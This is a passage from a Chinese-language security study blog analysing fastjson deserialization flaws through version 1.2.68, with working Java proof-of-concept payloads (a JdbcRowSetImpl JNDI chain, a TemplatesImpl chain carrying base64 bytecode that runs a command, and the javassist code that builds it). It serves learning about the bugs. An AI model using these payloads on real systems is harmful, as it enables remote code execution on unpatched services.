+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413215143233.png" alt="image-20250413215143233"></p>
+<p>里面调用了很多方法，注意图中，是放入了一个Class.class的键，看这个对应的类，之类就是获取到这个类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221119366.png" alt="image-20250413221119366"></p>
+<p>而这个类的deserialze()方法存在一个存在一个利用点：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221259065.png" alt="image-20250413221259065"></p>
+<p>这里会调用loadClass()方法，就是我们之前熟知的方法，在这里存在一个利用点：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413225515367.png" alt="image-20250413225515367"></p>
+<p>这里的cache默认是true，所以这里会将对应的className放进mappings，并且这里的参数是可控的，从参数传递来看，这里的className就是前面的strVal变量：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221458695.png" alt="image-20250413221458695"></p>
+<p>而setVal变量是由objVal变量转换来的，objVal又是从json字符串解析来的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221607262.png" alt="image-20250413221607262"></p>
+<p>是不是看到这里还有点懵，别急，为什么这里要提到deserialze()方法呢，当我们正常反序列化时，同时其实从前面的调试过程可以知道，是会获取deserializer并调用它的deserialze()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221927894.png" alt="image-20250413221927894"></p>
+<p>所以对应的，我们可以先尝试传入Class.class，从而获取到MiscCodec类实例，从而调用到它的deserialze()方法，从而往mappings中放入想要利用的类，从而在直接在后续中获得想要的类，如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413222531904.png" alt="image-20250413222531904"></p>
+<p>所以综上上面的思路，需要调用两次，一次放进指定类，一次加载触发反序列化，可以尝试如下构造：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;1\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;2\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}}\n&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行后弹出计算机，注意是打的jndi打法。</p>
+<p>这里的细节就是没有设置autoTypeSupport，默认为false，那么第一个判断黑名单的就不会进入：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413224421887.png" alt="image-20250413224421887"></p>
+<p>而第二个判断黑名单的地方不会到达：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413224459135.png" alt="image-20250413224459135"></p>
+<p>直接在中间就找到直接结束了，所以也是payload中第二个可以那样设置的原因。</p>
+<p>TemplatesImpl的打法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;1\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;},\&#34;2\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}}\n&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行后均弹出计算机。</p>
+<p>确实可以。</p>
+<h3 id="1268">1.2.68</h3>
+<p>而在1.2.48版本之后，在<code>MiscCodec</code>中修改了<code>cache</code>的默认值为<code>false</code>，并且对<code>TypeUtils.loadClass</code>中的<code>mapping.put</code>做了限制。</p>
+<p>改一下版本即可，这里以1.2.68版本来表示一下对1.2.47版本的限制，首先就是将cache改成false：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250414205607155.png" alt="image-20250414205607155"></p>
+<p>其次就是。剩下的后面再学，不想看了现在。去看反序列化调用链了。具体利用可看如下文章：</p>
+<p><a href="https://su18.org/post/fastjson-1.2.68/#charsequenceinputstream">https://su18.org/post/fastjson-1.2.68/#charsequenceinputstream</a></p>
+<p>和nivia的文章。</p>
+<p>这个提高篇也可以看一看：
+<a href="https://xz.aliyun.com/news/12852">https://xz.aliyun.com/news/12852</a></p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/news/14309">https://xz.aliyun.com/news/14309</a></p>
+<p><a href="https://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37">https://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37</a></p>
+<p><a href="https://tttang.com/archive/1579/#toc_1244">https://tttang.com/archive/1579/#toc_1244</a></p>
+
+    </article>
+    <aside class="sidebar sidebar-right page-outline" aria-label="本页目录">
+      <div class="sidebar-title">本页目录</div>
+      
+        <div class="toc-content">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fastjson反序列化">fastjson反序列化</a>
+      <ul>
+        <li><a href="#基本过程了解">基本过程了解</a>
+          <ul>
+            <li><a href="#调试分析">调试分析</a></li>
+            <li><a href="#type属性说明">@type属性说明</a></li>
+            <li><a href="#补充说明">补充说明</a></li>
+          </ul>
+        </li>
+        <li><a href="#利用链学习">利用链学习</a>
+          <ul>
+            <li><a href="#fastjson1224">fastjson&lt;=1.2.24</a></li>
+            <li><a href="#1225fastjson1241">1.2.25&lt;=fastjson&lt;=1.2.41</a></li>
+            <li><a href="#1242">1.2.42</a></li>
+            <li><a href="#1243">1.2.43</a></li>
+            <li><a href="#1244">1.2.44</a></li>
+            <li><a href="#1245">1.2.45</a></li>
+            <li><a href="#1247">1.2.47</a></li>
+            <li><a href="#1268">1.2.68</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+      
+    </aside>
+  </main>
+
+    
+    
+      
+      
+      
+      
+      
+        
+      
+      
+    
+      
+      
+      
+      
+      
+        
+      
+      
+    
+      
+      
+      
+      
+      
+        
+      
+      
+    
+      
+      
+      
+      
+      
+        
+      
+      
+    
+    <script type="application/json" id="site-search-index">[{"content":"Hugo 与 GitHub Pages 把 hugo.toml 里的 baseURL 改为你的 GitHub Pages 地址，然后推送到 GitHub。\n如果使用用户主页仓库 fupanc-w1n.github.io，配置为：\nbaseURL = \u0026#34;https://fupanc-w1n.github.io/\u0026#34;","date":"2026-5-15","summary":"Hugo 与 GitHub Pages 把 hugo.toml 里的 baseURL 改为你的 GitHub Pages 地址，然后推送到 GitHub。\n如果使用用户主页仓库 fupanc-w1n.github.io，配置为：\nbaseURL = \u0026#34;https://fupanc-w1n.github.io/\u0026#34;","title":"Hugo 与 GitHub Pages","url":"/posts/notes/hugo-github-pages/"},{"content":"快速开始 在 content/posts 下创建 Markdown 文件即可新增文章。\nhugo new content posts/guide/my-first-post.md 如果你希望在导航里出现一个文件夹，请在对应目录下添加 _index.md。目录显示名称会使用文件夹名。","date":"2026-5-14","summary":"快速开始 在 content/posts 下创建 Markdown 文件即可新增文章。\nhugo new content posts/guide/my-first-post.md 如果你希望在导航里出现一个文件夹，请在对应目录下添加 _index.md。目录显示名称会使用文件夹名。","title":"快速开始","url":"/posts/guide/getting-started/"},{"content":"fastjson反序列化 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以序列化一个对象为json字符串们，也可以反序列化一个json字符串为一个对象，其实也就是和jackson差不多的。\n基本过程了解 在这里先来看json序列化和反序列化的过程。\n导入依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 如下就是一个简单的序列化和反序列化的过程：\npackage fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 输出为：\n=====序列化===== {\u0026#34;age\u0026#34;:1233,\u0026#34;name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====反序列化===== fupanc 1233 这里的转换过程其实是和jackson差不多的，都是调用的getter和setter来进行的取值与赋值。\n@JSONField注解 不知道有没有用，先简单了解一下，通过这个注解，我们可以自定义字段的名称的输出，如下demo：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 此时的输出为：\n=====序列化===== {\u0026#34;user_age\u0026#34;:1233,\u0026#34;user_name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====反序列化===== fupanc 1233 从结果可以看出来这里的具体示例，也就是当使用了@JSONField这个注解，序列化时会将这个注解标注的字段的字段名序列化为注解指定的字段名，而反序列化时就会自动识别到这个注解标注的字段从而成功反序列化赋值。\n调试分析 调试分析一下这里获取getter和setter的过程，这里就来简单说说我这里的调试过程\n序列化过程 在JSON.toJSONString()处打一个断点开始调试，通过调试时的变量的值的替换，在这一步后发现调用变量存在了getter方法：\n此时的调用栈为：\nwrite:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) 我们跟进这个getObjectWriter()方法，然后一直跟进，可以发现其实主要的获取到getter方法存在如下：\n跟进这个createJavaBeanSerializer()方法：\n这里主要起作用的代码也在图中标注了，最重要的就是方法内部的第一行代码，跟进这里调用的buildBeanInfo()方法：\n再跟进这里的parserAllFieldToCache()方法：\n常见的获取字段名的操作，获取到后还将起放入到了这形参传入的HashMap类实例中，还可以看到是尝试获取了父类的字段值。\n回到buildBeanInfo()方法，另外一个非常重要的方法就是computeGetters()方法：\n可以很容易看出来这里就是一个获取方法的操作，最后还是将其放入到键值对中：\n过程就不具体说了，可以自己跟一下。再回到buildBeanInfo()方法，然后对字段进行了一下排序，再返回了一个实例化的SerializeBeanInfo类：\n所以这里其实也就是一个获取到类中的信息的函数调用的操作，其实基本获取到了需要的所有消息。然后就会调用到createJavaBeanSerializer()方法：\n后续具体也就不说了，都是一些进行处理的操作。\n最后这里赋值的getters就是后续要用到的，此时的调用栈如下：\n\u0026lt;init\u0026gt;:73, JavaBeanSerializer (com.alibaba.fastjson.serializer) createJavaBeanSerializer:152, SerializeConfig (com.alibaba.fastjson.serializer) createJavaBeanSerializer:126, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:580, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:355, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:329, JSONSerializer (com.alibaba.fastjson.serializer) write:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) 其他过程就不多说了，重点就是获取到getter方法，对于后面的调用getter方法来获取值，代码如下：\n调用invoke()方法来进行调用，调用栈如下：\nget:450, FieldInfo (com.alibaba.fastjson.util) getPropertyValueDirect:110, FieldSerializer (com.alibaba.fastjson.serializer) write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer) write:275, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:13, Fastjson_Test (fastjson) 自己调一下就知道了。\n反序列化过程 打断点于JSON.parseObject()方法，反序列化，主要还是对setter方法的获取和调用。调试发现获取到类是在如下方法：\n那么想要获取到的过程就在这个方法中，此时调用栈：\nparseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:18, Fastjson_Test (fastjson) 继续跟进这个方法，一直走，看到一个非常熟悉的变量：\nJavaBeanInfo，应该同样是一个获取到类相关属性的操作，跟进这里调用的build()方法，可以看到又是一个获取类的变量以及方法的处理：\n后面就是对方法的处理，来获取到setter方法，还有处理getter方法的逻辑，这里也就不多说了，在这里的处理方法都是将获取到的类属性，放入到一个FieldInfo类中，然后放入到一个数组中，最后实例化一个JavaBean类：\n继续跟进这个类的实例化，然后还是将其赋值给这个类的变量，和序列化那里大相径庭：\n具体如下：\n也就是获取到了一个变量的setter方法。那么哪里对这个setter进行了调用呢，这里赋值完了然后，一直回退，到如下方法：\n这里是将生成的derializer放进一个键值对，然后一直回退，会调用deserialze方法进行处理，然后一直往后面走，这里会调用createInstance()方法来创建一个类实例：\n主要是利用的无参构造方法：\ncreateInstance()方法也就是返回的这个object，回到调用的deserialze方法，继续往后，会调用setValue()方法来进行赋值：\nsetValue()方法内部同样调用了invoke()方法进行赋值：\n可以看到这里就是对前一个类实例调用的setAge()方法，从而可以成功赋值，并且最后是返回的这个赋值完了的类实例：\n最后就成功json反序列化得到了指定的类。\n从上面的整个过程来看，可以看出确实是调用的getter和setter来进行的序列化和反序列化的取值与赋值，现在来看看这里的具体利用。\n@type属性说明 在前面我们都是对一个类进行的json序列化和反序列化，从而可以获取并调用到对应类的getter和setter，但是既然都是获取getter了，那么肯定是要尝试常见的Templates链，那么怎么可以指定一个类的序列化呢？这就与@type属性有关了，这个属性可以直接解析指定的类，我们可以进行如下尝试：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { JSONObject person1 = JSON.parseObject(\u0026#34;{\\\u0026#34;user_age\\\u0026#34;:1233,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;}\u0026#34;); System.out.println(person1); } } 简单调试理解一下，可以知道这里大概就是一个将String类型的json字符串给解析成一个JSONObject对象，对象存在如下内容：\n那么但是这样就不能将其解析为一个对象了，和我们之前分析的有很大区别，这里就需要利用到@type这个属性了，如下测试：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { String string = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;fastjson.Person\\\u0026#34;,\\\u0026#34;user_age\\\u0026#34;:1233,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;}\u0026#34;; JSONObject person1 = JSON.parseObject(string); System.out.println(person1); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 其实主要就是前面部分有点区别，后面部分和前面调试分析的反序列化过程就很想像了，我们还是打断点于parseObject()方法，然后会调用parse()方法：\n持续跟进重载的parse()方法，如下的代码处理是最关键的：\n会调用DefaultJSONParser类的parse()方法，然后就给出关键部分吧，过程涉及到的类比较多，还是给一个调用栈就行了，自己调试一下过程即可，到如下关键代码处：\n这里会调用TypeUtils类的loadClass()方法，注意一下这里条件的满足，需要key为@type等，并且这里实际是调用类加载器来加载Person类：\n调用栈如下：\nloadClass:1032, TypeUtils (com.alibaba.fastjson.util) parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, Fastjson_Test (fastjson) 在返回了这个Class对象后，然后又跟进，到如下代码：\n这里不就是前面反序列化时的代码吗，所以是可以调用到setter方法的，就不分析了，可以成功获取到Person类实例：\n所以最后还是返回的这个Person类对象，只是将其转换成了JSON对象： 而在这个toJSON方法中，又存在前面分析的序列化过程，跟进这个toJSON()方法，在后续重载的toJSON()方法中，调用到了如下方法：\n一直往后面跟可以知道就是前面的序列化过程，这里就不多说了，最后获取到的对象如下：\n继续往后面看：\n这里的getFieldValuesMap()方法就是调用getter来获取值，然后以键值对形式放入JSONObject中，最后返回了JSONObject实例，也就是最后调用parseObject()获取到的东西。\n从上面的整个过程来看，即调用了setter，还调用了getter，后面从几个版本来来看看这里的利用点。\n这里还有个点不得不说明：fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。具体体现就在后面的例子中说明。\n还有些其他要求，这里就不多说了，看后面的调用链，并且其实在前面的代码调试分析中都是有体现的，只是没细说。\n补充说明 主要是补充前面遗漏的一个细节，在前面的分析中，也是提到了一个点，在反序列化的时候，除了会调用setter，还会处理getter，在一定情况下，这个的getter利用是非常关键且重要的，我们还是以上面反序列化的代码进行测试，分析几个必要的条件，然后再给出一个例子来进行证明，分析代码还是如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 这里就直接聚焦于反序列化了，其实重点就是两个地方，方法的获取以及调用，对于方法的获取，在前面都是提到了，对于方法的调用是一笔带过的，这里具体分析一下，当时提到了会有对getter方法的处理，因为我们这里获取方法是直接调用的getMethods()来进行的，这里先从反序列化调用setter的代码来看，基本的调用是差不多的：\n在取方法并进行调用的代码位于：\n在setValue()方法的调用：\n也就是前面传递的fieldInfo变量，此时的变量定义如下：\n最后是再调用的invoke()方法来进行的方法调用：\n调用栈为：\nsetAge:42, Person (fastjson) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:18, Fastjson_Test (fastjson) 我们再来看一下关键的sortedFieldDeserializers变量的赋值的地方： 其实就是sortedFields，也就是上面的JavaBeanInfo.build()方法调用的类变量的结果：\n具体实现在： 这里也是前面标注出来的，数组copy过程，这里就涉及到了一个非常重要的变量：fielList ，也是形参传递的一个变量，回过去看这个变量的赋值情况，可以发现主要是通过下面这个方法来进行赋值的：\n并且这个是存在于处理getter方法的逻辑中的，我们去看一下需要处理的条件：\n方法名字长度得大于4，然后不能是静态方法，然后需要以get开头，还有条件如下：\n需要满足这个方法的返回值是这几个类型中的其中一个才能进入后面的条件，并且还需要这个变量没有setter，只有getter ：\n跟进这里关键的getField()方法：\n从上面的代码可以看出来，这里需要返回null，看这里的代码逻辑，就是判断这个fieldList是否有相同的字段名称，而在前面的fieldList赋值逻辑中，是先处理的setter，然后才是处理的getter，为了这里能返回null，所以需要这个字段没有setter，这fieldList中才不会有这个\u0026quot;name\u0026quot; ，基于上面的条件，可以进行如下代码测试：\npackage fastjson; import com.alibaba.fastjson.JSON; import java.util.Map; public class Fastjson_Test{ public static void main(String[] args) { Person obj = (Person)JSON.parseObject(\u0026#34;{\\\u0026#34;map\\\u0026#34;:{}}\u0026#34;,Person.class); } } class Person { private Map map; public Person() { } public Map getMap() { try{ java.lang.Runtime.getRuntime().exec(\u0026#34;open -a Calculator\u0026#34;); }catch (Exception e){ e.printStackTrace(); } return map; } } 运行成功弹出计算机。如下几个点说明：\n为什么是反序列化的{\u0026quot;map\u0026quot;:{}}，其实这个点是在下面的fastjson\u0026lt;=1.2.24的TemplatesImpl链说过的，也就是如果json字符串没有对变量进行赋值，fastjson会获取这个变量的默认类型的无参构造方法进行实例化然后赋值。 然后就再调试看一下这里的getter方法的调用代码实现，前面都还是差不多的，利用点变了： 跟进这个parseField()方法：\n这里还是会调用到setValue()方法： 最后还是成功调用invoke()方法从而调用getMap()方法从而弹出计算机。\n利用链学习 fastjson\u0026lt;=1.2.24 两条链子，这里来调试分析一下，依赖为：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; TemplatesImpl链 既然都是可以调用getter和setter了，那么在JDK8环境下最经典的还是TemplatesImpl链了，这里利用的getter方法还是getOutputProperties()方法，这个方法内部会调用到newTransformer()方法，从而完成一次完整的链子的调用，POC如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import java.util.Base64; public class Fastjson_Test { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); String encodedCode = Base64.getEncoder().encodeToString(classBytes); System.out.println(encodedCode); String json = 